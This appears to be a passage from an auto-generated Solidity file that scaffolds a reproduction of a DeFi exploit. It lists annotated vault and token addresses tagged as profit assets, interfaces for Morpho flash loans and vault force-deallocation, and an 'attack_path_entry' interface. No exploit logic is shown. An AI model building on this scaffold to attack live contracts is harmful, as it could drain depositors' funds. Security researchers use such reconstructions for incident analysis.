    address internal constant A_E89405_210B = 0xE894055CA1c73648927e225f3Ca38Ed48E30210b; // Addresses.A_E89405_210B = 0xe894055ca1c73648927e225f3ca38ed48e30210b label=unresolved roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant A_E8ADFF_EDB0 = 0xE8aDfF9117151fb5ad7313873780b87cC56EEDB0; // Addresses.A_E8ADFF_EDB0 = 0xe8adff9117151fb5ad7313873780b87cc56eedb0 label=unresolved roles=observed_address source=unresolved confidence=low
    address internal constant A_E945DE_1EA4 = 0xe945de0D08E2F39B0740FE2d6e50FE2Bb9751eA4; // Addresses.A_E945DE_1EA4 = 0xe945de0d08e2f39b0740fe2d6e50fe2bb9751ea4 label=unresolved roles=recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant LVUSDC_CB06 = 0xE9cDA459bED6dcfb8AC61CD8cE08E2D52370cB06; // Addresses.LVUSDC_CB06 = 0xe9cda459bed6dcfb8ac61cd8ce08e2d52370cb06 label=LVUSDC token_symbol=LVUSDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant A_EA5E08_5205 = 0xea5e089D0d526b570ed394D59E9edfd8b59A5205; // Addresses.A_EA5E08_5205 = 0xea5e089d0d526b570ed394d59e9edfd8b59a5205 label=unresolved roles=sender source=unresolved confidence=low
    address internal constant A_EB32A3_6FD7 = 0xeb32a309405c72253d5dB9ef28310A8Ff56b6fd7; // Addresses.A_EB32A3_6FD7 = 0xeb32a309405c72253d5db9ef28310a8ff56b6fd7 label=unresolved roles=recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_EB60A8_0D9D = 0xEB60A8e747d73c58cCc320bcdAbB166F8A0C0D9D; // Addresses.A_EB60A8_0D9D = 0xeb60a8e747d73c58ccc320bcdabb166f8a0c0d9d label=0xeb60a8e747d73c58ccc320bcdabb166f8a0c0d9d roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=asset_delta.profit_candidates confidence=medium
    address internal constant A_EBA9B3_7F8E = 0xeBA9b3d4336802CcfbDB80AfBDA820e9Eef97f8e; // Addresses.A_EBA9B3_7F8E = 0xeba9b3d4336802ccfbdb80afbda820e9eef97f8e label=unresolved roles=observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant AVGUSDCcons = 0xeBBaE8CfAbB0092d5B32f00EBeE0c8139d24dDcd; // Addresses.AVGUSDCcons = 0xebbae8cfabb0092d5b32f00ebee0c8139d24ddcd label=AVGUSDCcons token_symbol=AVGUSDCcons roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant apfUSDC = 0xed9278c5188f37670b33ef3B00729E38260cd5D5; // Addresses.apfUSDC = 0xed9278c5188f37670b33ef3b00729e38260cd5d5 label=unresolved token_symbol=apfUSDC roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant fxSP_Gauge = 0xEd92dDe3214c24Ae04F5f96927E3bE8f8DbC3289; // Addresses.fxSP_Gauge = 0xed92dde3214c24ae04f5f96927e3be8f8dbc3289 label=unresolved token_symbol=fxSP-Gauge roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_EDC6A6_F9EA = 0xedC6a603B31391B7D13fBa6A721fd4DDa401f9eA; // Addresses.A_EDC6A6_F9EA = 0xedc6a603b31391b7d13fba6a721fd4dda401f9ea label=unresolved roles=recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_EE828F_1E4E = 0xEE828F95f95F0a0bbec792C4c9D2aF86918F1e4e; // Addresses.A_EE828F_1E4E = 0xee828f95f95f0a0bbec792c4c9d2af86918f1e4e label=unresolved roles=observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_EF1BC6_024B = 0xEF1BC66E0eA9717a3f2C969633A989D6BF41024B; // Addresses.A_EF1BC6_024B = 0xef1bc66e0ea9717a3f2c969633a989d6bf41024b label=unresolved roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant A_EFE749_CE17 = 0xefE74995689f850123f67C73d61C64B03a7Dce17; // Addresses.A_EFE749_CE17 = 0xefe74995689f850123f67c73d61c64b03a7dce17 label=unresolved roles=sender source=unresolved confidence=low
    address internal constant dUSDC_117 = 0xf2B2c0C283b7C6aad5Ce10065C67deE5419f3c64; // Addresses.dUSDC_117 = 0xf2b2c0c283b7c6aad5ce10065c67dee5419f3c64 label=unresolved token_symbol=dUSDC-117 roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant eUSDC_16 = 0xf2f826c190D020A6D1EC422bF2269E63b8b315E0; // Addresses.eUSDC_16 = 0xf2f826c190d020a6d1ec422bf2269e63b8b315e0 label=unresolved token_symbol=eUSDC-16 roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_F4EA3E_CECF = 0xF4Ea3Ec87B1c254f17a2Fb68164dB0CAf6c4cecF; // Addresses.A_F4EA3E_CECF = 0xf4ea3ec87b1c254f17a2fb68164db0caf6c4cecf label=unresolved roles=recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_F56E94_63B3 = 0xF56E946e92FeF6a050F482C560b5f8DcCB8163B3; // Addresses.A_F56E94_63B3 = 0xf56e946e92fef6a050f482c560b5f8dccb8163b3 label=unresolved roles=recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_F62F45_36D6 = 0xF62F458D2F6dd2AD074E715655064d7632e136D6; // Addresses.A_F62F45_36D6 = 0xf62f458d2f6dd2ad074e715655064d7632e136d6 label=unresolved roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant A_F6E72D_3042 = 0xf6e72Db5454dd049d0788e411b06CfAF16853042; // Addresses.A_F6E72D_3042 = 0xf6e72db5454dd049d0788e411b06cfaf16853042 label=unresolved roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_F72942_A9B1 = 0xf729422D68c2cf00574fb5712972454cf402A9b1; // Addresses.A_F72942_A9B1 = 0xf729422d68c2cf00574fb5712972454cf402a9b1 label=unresolved roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant dPT_cUSDO_20NOV2025_146 = 0xF85f6DF6bA5Fca5C98fc701Bda9C757F76394405; // Addresses.dPT_cUSDO_20NOV2025_146 = 0xf85f6df6ba5fca5c98fc701bda9c757f76394405 label=unresolved token_symbol=dPT-cUSDO-20NOV2025-146 roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant bUSDC_124 = 0xf887B602a746f932f9BbCb6334D3407B7eec23Ce; // Addresses.bUSDC_124 = 0xf887b602a746f932f9bbcb6334d3407b7eec23ce label=unresolved token_symbol=bUSDC-124 roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_F8DB64_2894 = 0xf8Db64D39D1c7382fE47De8B72435c7e9DFB2894; // Addresses.A_F8DB64_2894 = 0xf8db64d39d1c7382fe47de8b72435c7e9dfb2894 label=unresolved roles=recipient|storage_contract source=unresolved confidence=low
    address internal constant sUSDC_20BA = 0xf943Cb8D5f06f2bBF352878ebEF3Ec5C537A20bA; // Addresses.sUSDC_20BA = 0xf943cb8d5f06f2bbf352878ebef3ec5c537a20ba label=unresolved token_symbol=sUSDC roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant USDG_A65F = 0xFACd5ff359aDf87822374275699Dd518aAf9a65F; // Addresses.USDG_A65F = 0xfacd5ff359adf87822374275699dd518aaf9a65f label=unresolved token_symbol=USDG roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant A_FBE454_ADF6 = 0xfBE454F609C5F54cefe3F486129f05Dfa081Adf6; // Addresses.A_FBE454_ADF6 = 0xfbe454f609c5f54cefe3f486129f05dfa081adf6 label=unresolved roles=asset|contract|observed_address|recipient|sender source=unresolved confidence=low
    address internal constant dPT_eUSDE_14AUG2025_123 = 0xfc22B9cd43589f4409b94af5682CbAf4B4c3ac5b; // Addresses.dPT_eUSDE_14AUG2025_123 = 0xfc22b9cd43589f4409b94af5682cbaf4b4c3ac5b label=unresolved token_symbol=dPT-eUSDE-14AUG2025-123 roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant dPT_sUSDE_25SEP2025_124 = 0xfcEAAA5cB772d618644Eb848ae2774dacD61ed28; // Addresses.dPT_sUSDE_25SEP2025_124 = 0xfceaaa5cb772d618644eb848ae2774dacd61ed28 label=unresolved token_symbol=dPT-sUSDE-25SEP2025-124 roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_FD1EA1_3DE4 = 0xfD1Ea12d29B90630b265DBbc6Af88266d1a83dE4; // Addresses.A_FD1EA1_3DE4 = 0xfd1ea12d29b90630b265dbbc6af88266d1a83de4 label=unresolved roles=recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_FD6165_B112 = 0xfD616567EcC1607F61073951A1E822F7315bB112; // Addresses.A_FD6165_B112 = 0xfd616567ecc1607f61073951a1e822f7315bb112 label=unresolved roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant A_FD8993_8519 = 0xfD899321B1FD8d75e255119766D9097C98568519; // Addresses.A_FD8993_8519 = 0xfd899321b1fd8d75e255119766d9097c98568519 label=unresolved roles=observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=observed_address source=unresolved confidence=low
}

struct Abi_exactOutput_Param0 {
    bytes field0;
    address field1;
    uint256 field2;
    uint256 field3;
    uint256 field4;
}

struct Abi_accrueInterest_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
}

struct Abi_borrowRate_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
}

struct Abi_borrowRate_Param1 {
    uint128 field0;
    uint128 field1;
    uint128 field2;
    uint128 field3;
    uint128 field4;
    uint128 field5;
}

interface IAVGUSDCcons {
    function convertToAssets(uint256) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function forceDeallocate(address, bytes calldata, uint256, address) external returns (uint256);
    function forceDeallocatePenalty(address) external view returns (uint256);
    function liquidityAdapter() external view returns (uint256);
}

interface IAdaptiveCurveIrm {
    function borrowRate(Abi_borrowRate_Param0 calldata, Abi_borrowRate_Param1 calldata) external returns (uint256);
}

interface IApi3CoreUSDC {
    function convertToAssets(uint256) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function forceDeallocate(address, bytes calldata, uint256, address) external returns (uint256);
    function forceDeallocatePenalty(address) external view returns (uint256);
    function liquidityAdapter() external view returns (uint256);
}

interface IContract_DF62F5_A22F {
    function marketIdsLength() external view returns (uint256);
}

interface IContract_E59242_1564 {
    function exactOutput(Abi_exactOutput_Param0 calldata) external returns (uint256);
}

interface IContract_EBA9B3_7F8E {
    function vault() external view returns (uint256);
}

interface IContract_FBE454_ADF6 {
    function marketIds(uint256) external view returns (uint256);
    function marketIdsLength() external view returns (uint256);
}

interface ICurveRouter_v1_2 {
    function exchange(address[11] calldata, uint256[5][5] calldata, uint256, uint256, address[5] calldata, address)
        external
        returns (uint256);
}

interface IERC4626Ark_0F29 {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IERC4626Ark_2AD5 {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IERC4626Ark_59E8 {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IERC4626Ark_80EB {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IERC4626Ark_8721 {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IERC4626Ark_9A28 {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IKPK_USDC_Prime {
    function convertToAssets(uint256) external view returns (uint256);
    function forceDeallocate(address, bytes calldata, uint256, address) external returns (uint256);
    function forceDeallocatePenalty(address) external view returns (uint256);
    function liquidityAdapter() external view returns (uint256);
}

interface ILVUSDC {
    function convertToShares(uint256) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function getConfig() external view;
    function redeem(uint256, address, address) external returns (uint256);
    function totalAssets() external view returns (uint256);
    function withdrawableTotalAssets() external view returns (uint256);
}

interface ILVUSDC_CB06 {
    function convertToAssets(uint256) external view returns (uint256);
    function convertToShares(uint256) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function getActiveArks() external view;
    function getConfig() external view;
    function totalAssets() external view returns (uint256);
    function withdrawFromArks(uint256, address, address) external returns (uint256);
    function withdrawFromBuffer(uint256, address, address) external returns (uint256);
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IMorpho {
    function accrueInterest(Abi_accrueInterest_Param0 calldata) external;
    function flashLoan(address, uint256, bytes calldata) external;
    function idToMarketParams(bytes32) external view;
    function market(bytes32) external view;
    function position(bytes32, address) external view;
}

interface IMorphoMarketV1AdapterV2 {
    function marketIds(uint256) external view returns (uint256);
    function marketIdsLength() external view returns (uint256);
}

interface IMorphoMarketV1AdapterV2_8B41 {
    function marketIds(uint256) external view returns (uint256);
    function marketIdsLength() external view returns (uint256);
}

interface IMorphoMarketV1AdapterV2_E001 {
    function marketIds(uint256) external view returns (uint256);
    function marketIdsLength() external view returns (uint256);
}

interface IMorphoV2VaultArk_0B25 {
    function vault() external view returns (uint256);
}

interface IMorphoV2VaultArk_400B {
    function vault() external view returns (uint256);
}

interface IMorphoV2VaultArk_958F {
    function vault() external view returns (uint256);
}

interface IMorphoV2VaultArk_C7B5 {
    function vault() external view returns (uint256);
}

interface IMorphoVaultArk_14C6 {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IMorphoVaultArk_8AEB {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IMorphoVaultArk_FD6D {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IPermit2 {
    function approve(address, address, uint160, uint48) external;
    function approve(address spender, uint256 amount) external;
}

interface IRouter {
    function swapSingleTokenExactIn(address, address, address, uint256, uint256, uint256, bool, bytes calldata)
        external
        returns (uint256);
}

interface ISkyRewardsArk {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface ISyrupArk {
    function withdrawableTotalAssets() external view returns (uint256);
}

interface IUniversalRouter {
    function execute(bytes calldata, bytes[] calldata, uint256) external;
}

interface Iattack_path_entry {
    function onMorphoFlashLoan(uint256, bytes calldata) external;
    function tryBuyToken(uint256) external returns (uint256);
}

interface Igtusdcp {
    function convertToAssets(uint256) external view returns (uint256);
    function forceDeallocatePenalty(address) external view returns (uint256);
    function liquidityAdapter() external view returns (uint256);
}

interface IskyMoneyUsdcRiskCapital {
    function convertToAssets(uint256) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function forceDeallocate(address, bytes calldata, uint256, address) external returns (uint256);
    function forceDeallocatePenalty(address) external view returns (uint256);
    function liquidityAdapter() external view returns (uint256);
}

interface ItsvSummerfiUSDC {
    function deposit(uint256, address) external returns (uint256);
}

interface IvgUSDC {
    function convertToShares(uint256) external view returns (uint256);
    function previewRedeem(uint256) external view returns (uint256);
}

struct Abi_withdraw_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
}

struct Abi_supply_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
}

